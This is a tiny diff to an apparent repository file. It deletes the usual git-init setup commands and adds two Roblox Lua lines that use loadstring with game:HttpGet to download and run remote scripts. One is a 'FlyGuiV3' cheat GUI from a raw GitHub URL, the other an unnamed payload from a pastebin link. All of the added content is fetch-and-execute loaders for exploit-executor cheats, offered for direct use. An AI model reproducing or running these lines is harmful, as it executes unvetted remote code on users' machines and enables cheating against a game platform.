@@ -1,7 +1,2 @@
-echo "# idk" >> README.md
-git init
-git add README.md
-git commit -m "first commit"
-git branch -M main
-git remote add origin https://github.com/iamhumaniswear/idk.git
-git push -u origin main
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/0hn40Zbc"))()
